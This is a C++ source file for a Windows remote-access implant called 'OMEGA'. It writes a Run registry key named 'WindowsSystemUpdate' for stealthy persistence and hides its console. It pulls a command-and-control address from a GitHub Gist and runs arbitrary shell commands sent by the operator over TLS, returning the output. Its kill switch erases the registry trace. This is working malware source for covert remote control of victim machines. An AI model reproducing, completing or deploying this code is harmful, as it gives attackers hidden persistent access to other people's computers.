#include <iostream>
#include <string>
#include <openssl/ssl.h>
#include <openssl/err.h>
#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#endif

#include <fstream>
#include <chrono>
#include <ctime>
#include "ssl_client.h"
#include "executor.h"
#include "../common/protocol.h"
#include "../common/utils.h"
#include "../common/config.h"

// Function to add the executable to the Windows Registry for Auto-Run
void InstallPersistence() {
#ifdef _WIN32
    if (!AUTO_PERSISTENCE) return;

    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) return;

    HKEY hKey;
    const char* runKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKeyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Name the registry entry 'WindowsSystemUpdate' for stealth
        RegSetValueExA(hKey, "WindowsSystemUpdate", 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
#endif
}

// Function to obliterate the persistence footprint and uninstall itself
void RemovePersistence() {
#ifdef _WIN32
    HKEY hKey;
    const char* runKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKeyPath, 0, KEY_SET_VALUE | KEY_WOW64_32KEY | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WindowsSystemUpdate");
        RegCloseKey(hKey);
    }
    // Also try without WOW64 flags
    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKeyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WindowsSystemUpdate");
        RegCloseKey(hKey);
    }
#endif
}

// Function to detach from console when double-clicked (fix cursor loading)
void DetachFromConsole() {
#ifdef _WIN32
    FreeConsole();
#endif
}

// Function to fetch the dynamic Ngrok C2 address from a GitHub Gist
#ifdef _WIN32
bool FetchC2AddressFromGist(const std::string& url, std::string& host, int& c2_port) {
    HINTERNET hInternet = InternetOpenA("WindowsUpdate", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    // Gunakan flag NO_CACHE agar Windows tidak mengambil data lama dari memory
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, 
                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        LogToFile("client.log", "[-] InternetOpenUrlA failed for GIST_RAW_URL");
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[1024];
    DWORD bytesRead;
    std::string response;

    while (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    size_t colonPos = response.find(':');
    if (colonPos != std::string::npos) {
        host = response.substr(0, colonPos);
        try {
            std::string portStr = response.substr(colonPos + 1);
            size_t endpos = portStr.find_last_not_of(" \n\r\t");
            if (std::string::npos != endpos) portStr = portStr.substr(0, endpos + 1);
            c2_port = std::stoi(portStr);
            return true;
        } catch (...) {
            return false;
        }
    }
    return false;
}
#endif

int main() {
    // 1. SINGLE INSTANCE CHECK (Mutex)
    // Ensures only one agent is running at a time to prevent conflicts.
#ifdef _WIN32
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\OMEGA_C2_CLIENT_MUTEX");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0; // Already running, exit silently
    }
#endif
    
    // DETACH FROM CONSOLE TO FIX CURSOR LOADING ON DOUBLE-CLICK
    // Check if running from Windows Explorer (parent process is explorer.exe)
#ifdef _WIN32
    DWORD parentPID = GetCurrentProcessId();
    DWORD ppid = 0;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (pe32.th32ProcessID == parentPID) {
                    ppid = pe32.th32ParentProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // Detach from console if parent is explorer.exe or other GUI app
    if (ppid > 0) {
        HANDLE hParentProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ppid);
        if (hParentProc != INVALID_HANDLE_VALUE) {
            char parentName[MAX_PATH] = {};
            if (GetProcessImageFileNameA(hParentProc, parentName, MAX_PATH) > 0) {
                std::string parent_str = parentName;
                if (parent_str.find("explorer.exe") != std::string::npos) {
                    DetachFromConsole();
                }
            }
            CloseHandle(hParentProc);
        }
    }
#endif
    
    // ONLY CREATE LOG FILES IF LOGGING IS ENABLED
    if (LOGGING_ENABLED) {
        EnsureDirectoryExists(LOG_DIR);
        LogToFile("client.log", "[*] OMEGA Agent started (Subsystem: WIN32)");
    }

    // HIDDEN MODE: No Console needed for -mwindows / WIN32 subsystem apps

    // 2. AUTO-RUN (Persistence)
    InstallPersistence();

    // 3. INITIALIZATION
    int port = SERVER_PORT;

    InitializeSockets();

    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    // 4. DYNAMIC C2 RESOLUTION & RECONNECTION LOOP
    int failed_attempts = 0;
    const int MAX_FAILED_ATTEMPTS = 3;
    
    while (true) {
        std::string host = "localhost";
        int dynamic_port = port;
        
#ifdef _WIN32
        // Force re-fetch from GitHub after 3 failed connection attempts
        if (failed_attempts >= MAX_FAILED_ATTEMPTS) {
            LogToFile("client.log", "[!] Failed " + std::to_string(failed_attempts) + " times. Re-fetching from GitHub for updates...");
            failed_attempts = 0; // Reset counter
        }
        
        // Fetch URL from Github Gist
        if (!FetchC2AddressFromGist(GIST_RAW_URL, host, dynamic_port)) {
            LogToFile("client.log", "[-] Failed to fetch C2 address from Gist cloud. Retrying...");
            // Wait 10 seconds before retrying if fetching failed (e.g., no internet right now)
            Sleep(10000);
            continue;
        }

        LogToFile("client.log", "[*] Resolved C2 Address: " + host + ":" + std::to_string(dynamic_port));
#endif

        SSLClient client(host, dynamic_port);
        
        if (!client.Connect()) {
            failed_attempts++;
            LogToFile("client.log", "[-] Connection failed (" + std::to_string(failed_attempts) + "/" + std::to_string(MAX_FAILED_ATTEMPTS) + ") to " + host + ":" + std::to_string(dynamic_port));
            // Fails: Wait 5 seconds before retrying the fetching
#ifdef _WIN32
            Sleep(5000);
#else
            sleep(5);
#endif
            continue; 
        }

        LogToFile("client.log", "[+] Secure connection established with Nexus Controller.");

        SSL* ssl = client.GetSSL();

        // Reset failed attempts counter on successful connection
        failed_attempts = 0;

        // Authentication Phase
        if (!SendSecureMessage(ssl, AUTH_TOKEN)) {
            client.Disconnect();
            
#ifdef _WIN32
            Sleep(5000);
#else
            sleep(5);
#endif
            continue;
        }

        // Execution Loop
        std::string command;
        while (true) {
            if (!ReceiveSecureMessage(ssl, command)) {
                // Server disconnected. Break to reconnect.
                break;
            }

            // Kill Switch interception
            if (command == ":kill") {
                RemovePersistence();
                SendSecureMessage(ssl, "Agent has successfully wiped registry footprint and is terminating indefinitely.\n");
                SendSecureMessage(ssl, "TERMINATED"); // Send CWD message slot as TERMINATED flag
                client.Disconnect(); // Properly close connection
#ifdef _WIN32
                if (hMutex) CloseHandle(hMutex); // Release mutex before exit
#endif
                CleanupSockets();
                EVP_cleanup();
                exit(0); // Immediately kill the agent, halting the background infinite loop forever.
            }

            // Sleep Switch interception
            if (command.substr(0, 7) == ":sleep ") {
                try {
                    int seconds = std::stoi(command.substr(7));
                    std::string msg = "Agent acknowledged sleep for " + std::to_string(seconds) + " seconds. Going Dark...";
                    SendSecureMessage(ssl, msg);
                    SendSecureMessage(ssl, "SLEEPING");
                    client.Disconnect();
#ifdef _WIN32
                    Sleep(seconds * 1000);
#else
                    sleep(seconds);
#endif
                    break; // Break the execution loop to reconnect after sleep
                } catch (...) {
                    SendSecureMessage(ssl, "[-] Invalid sleep duration.\n");
                    SendSecureMessage(ssl, Executor::GetCurrentDir());
                    continue;
                }
            }

            // Execute safely via Invisible Pipes
            std::string output = Executor::ExecuteCommand(command);

            // Get Current Working Directory internally
            std::string cwd = Executor::GetCurrentDir();

            // Send Output
            if (!SendSecureMessage(ssl, output)) {
                // Connection lost while sending. Break to reconnect.
                break;
            }

            // Send CWD state
            if (!SendSecureMessage(ssl, cwd)) {
                break;
            }
        }

        // If we reach here, the session dropped. Disconnect and loop back to retry.
        client.Disconnect();
#ifdef _WIN32
        Sleep(5000);
#else
        sleep(5);
#endif
    }

    // Unreachable in this daemon
    CleanupSockets();
    EVP_cleanup();

    return 0;
}
